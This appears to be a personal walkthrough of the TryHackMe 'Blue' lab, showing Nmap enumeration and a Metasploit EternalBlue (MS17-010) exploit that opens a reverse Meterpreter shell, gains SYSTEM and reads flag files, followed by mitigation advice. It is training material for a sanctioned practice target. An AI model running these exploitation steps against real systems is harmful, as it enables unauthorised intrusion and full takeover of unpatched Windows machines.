# Blue - TryHackMe Walkthrough

**Difficulty:** Easy  
**Platform:** TryHackMe  
**Room:** Blue  
**Date Completed:** May 12, 2026  
**Category:** Windows Exploitation / SMB Vulnerability  
**Focus Area:** EternalBlue (MS17-010)

---

## Overview

The **Blue** room is a beginner-friendly Windows exploitation lab focused on the famous **MS17-010 EternalBlue** vulnerability.

This vulnerability affected Microsoft SMBv1 and became widely known after being used in the **WannaCry ransomware attack** in 2017.

In this room, I learned how to:
- Enumerate open ports and services
- Identify SMB vulnerabilities
- Exploit MS17-010 using Metasploit
- Gain a Meterpreter shell
- Escalate privileges and capture flags

---

## Task 1: Reconnaissance

I started by scanning the target machine using Nmap.

```bash
nmap -sV -sC -oN blue_scan.txt <TARGET_IP>
```

### Findings

The scan showed several open ports, including:

- **135** - MSRPC  
- **139** - NetBIOS  
- **445** - SMB  

Since SMB was exposed, this immediately suggested a possible Windows file-sharing vulnerability.

I ran a vulnerability detection scan:

```bash
nmap --script smb-vuln-ms17-010 -p445 <TARGET_IP>
```

### Result

The target was confirmed vulnerable to:

**MS17-010 (EternalBlue)**

This meant the machine could likely be exploited remotely.

---

## Task 2: Exploitation

After confirming the vulnerability, I launched Metasploit.

```bash
msfconsole
```

Loaded the EternalBlue exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Configured the target:

```bash
set RHOSTS <TARGET_IP>
```

Selected payload:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Checked configuration:

```bash
show options
```

Ran the exploit:

```bash
run
```

### Result

The exploit succeeded and returned a Meterpreter session.

```bash
meterpreter >
```

At this point, I had remote access to the Windows target.

---

## Task 3: Post Exploitation

To gather more information, I checked system details:

```bash
sysinfo
```

Then confirmed current privileges:

```bash
getuid
```

Next, I migrated to a more stable process:

```bash
migrate <PID>
```

This helps avoid session instability or crashes.

---

## Task 4: Privilege Escalation

To gain SYSTEM privileges, I used:

```bash
getsystem
```

### Result

Privilege escalation succeeded.

```bash
NT AUTHORITY\SYSTEM
```

Now I had the highest level of access on the machine.

---

## Task 5: Flag Collection

After gaining SYSTEM access, I searched for the required flags.

### User Flag

Located and read:

```bash
type C:\Users\<username>\Desktop\user.txt
```

### Root Flag

Located and read:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

Successfully captured all required flags.

---

## Tools Used

- Nmap  
- Metasploit Framework  
- Meterpreter  

---

## What I Learned

This room helped me understand:

- Basic Windows enumeration
- SMB vulnerability scanning
- How EternalBlue works
- Using Metasploit modules effectively
- Basic post-exploitation workflow
- Privilege escalation using Meterpreter

---

## Real-World Relevance

MS17-010 was one of the most impactful Windows vulnerabilities in recent history.

It was used in:
- WannaCry
- NotPetya

This room reinforced why:
- SMBv1 should be disabled
- Windows systems must be patched regularly
- Legacy services are high-risk attack surfaces

---

## Mitigation

To protect against EternalBlue:

- Apply Microsoft MS17-010 patch
- Disable SMBv1
- Restrict SMB exposure externally
- Use network segmentation
- Monitor suspicious SMB traffic

---

## Screenshots

Screenshots were not captured during this lab session.  
Future walkthroughs will include screenshots for better documentation.

---

## References

- Microsoft MS17-010 Advisory  
- EternalBlue Documentation  
- TryHackMe Blue Room  

---
